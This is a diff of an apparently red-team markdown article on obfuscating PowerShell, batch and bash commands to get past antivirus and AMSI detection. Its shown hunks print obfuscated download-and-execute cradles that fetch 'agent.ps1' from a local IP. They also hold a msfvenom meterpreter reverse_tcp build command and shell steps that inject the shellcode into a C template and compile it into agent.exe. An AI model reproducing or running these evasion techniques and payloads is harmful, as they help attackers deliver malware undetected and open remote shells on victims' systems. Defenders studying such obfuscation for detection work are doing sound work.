@@ -1,27 +1,24 @@
 ![banner](http://i.cubeupload.com/1Kopfs.jpg)
 
-<br />
-
-
       This article contains a list of simple obfuscation technics that can be used into obfuscating system
       call's like (powershell.exe -EncodedCommand OR cmd.exe /c start /MIN) in one attempt to bypass AV's
-      AMSI and DEP detection mecanisms, why? let assume we have crypted our shellcode with one AES master
-      key, and the AV vendor can't read inside crypted sourcecode to determine if there actions are good or
-      bad, in this ocasion the AV vendor starts to look for system call's that may reveal malicious actions.
+      AMSI and DEP detection mechanisms, why? let assume we have crypted our shellcode with one AES master
+      key, and the AV vendor can't read inside the crypted shellcode to determine if there actions are good
+      or bad, in this ocasion the AV vendor also looks for system call's that may reveal malicious actions.
 
 ![detection pic](http://i.cubeupload.com/pLllwr.jpg)
 
 <br />
 
-      Special note:
+      SPECIAL NOTE:
         Remenber that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
-        interpreter (cmd.exe or file.bat). If we use one 'batch' special caracter in powershell terminal
+        interpreter (cmd.exe or file.bat), If we use one 'batch' special caracter in powershell terminal
         console, then the powershell interpreter will not be hable to escape the special caracter.
 
-**Bad caracter sellection** [ batch escape caracter -used- in powershell terminal ]
+**Bad caracter sellection** [ batch escape caracter -used- in powershell interpreter ]
 ![bad caracter sellection](http://i.cubeupload.com/5bsI07.jpg)
 
-**Good caracter sellection** [ powershell special caracter used in powershell terminal ]
+**Good caracter sellection** [ powershell special caracter used in powershell interpreter ]
 ![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
 
@@ -68,7 +65,6 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
 - Description of %varObj% master_key:<br />
 https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md
-      
 
 ---
 
@@ -89,7 +85,7 @@ The above string can be obfuscated using **bash special caracters: '** or **\\**
 
       w$@h$@o$@am$@i
 
-      w$@h\o$@am\i
+      w$@h\o$@am\i <-- using all 3 methods together 
 
 ![3 special caracters](http://i.cubeupload.com/tLBdbW.png)
 
@@ -122,7 +118,7 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
       power'+'shell IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//192.16'+'8.1.71/agent.ps1')
 
-- Using an **batch** local variable inside the powershell interpreter
+- Using an **batch** local variable inside the **powershell interpreter**
 
       cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe
 
@@ -130,8 +126,8 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 ![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
-- Using **$env:comspec** (powershell/windows enviroment variable) and **-Join''** to pull out the 4º,15º and 25º
-characters from $env:comspec variable and uses the **-Join''** operator to take the arraw and convert it to a string.
+- Using **$env:comspec** (windows environment variable) and **-Join''** to pull out the 4º,15º and 25º characters
+from $env:comspec variable and uses the **-Join''** operator to take the arraw and convert it to a string.
 
       $env:comspec[4,15,25]-Join'' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
@@ -150,16 +146,16 @@ characters from $env:comspec variable and uses the **-Join''** operator to take 
       8b5a00270d0a              <-- ANCII shellcode
 
 
-- Build shellcode in **C** format
+- Build shellcode in **C** format using msfvenom and escaping bad chars
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt
 
-- **Parsing** shellcode data
+- **Parsing** shellcode data (from C to ANCII)
 
-      # store parsed data into '$store' local var
+      # store parsed data into '$store' bash local variable
       store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`
 
-- **template.c**
+- **template.c** to be injected with generated shellcode
 
       #include
       #include
@@ -221,7 +217,7 @@ characters from $env:comspec variable and uses the **-Join''** operator to take 
       sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c
 
 
-- Compile template with **GCC** software
+- Compile template.c with **GCC** software to **.exe**
 
       gcc template.c -o agent.exe
 
@@ -230,13 +226,14 @@ characters from $env:comspec variable and uses the **-Join''** operator to take 
 
 <br /><br /><br />
 
-## Bypass the scan engine (author: daniel sauder: avet)
+## Bypass the scan engine (daniel sauder: avet)
 
       This next technic writes a file to disk before executing shellcode into target ram ..
+      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.
 
 <br />
 
-**template.c**<br />
+**template.c** from AVET<br />
 
 
       #include <stdio.h>
@@ -292,10 +289,11 @@ characters from $env:comspec variable and uses the **-Join''** operator to take 
 ### Referencies
 https://twitter.com/404death<br />
 https://github.com/govolution/avepoc<br />
+https://github.com/danielbohannon/Invoke-Obfuscation<br />
 https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
 
 <br />
 
 **Author: r00t-3xp10it**<br />
-**If you know more of this technics, fell free to report them ^_^**<br />
+**'If you know more of this technics, fell free to report them'  ^_^**<br />
 # Suspicious Shell Activity (red team) @2018
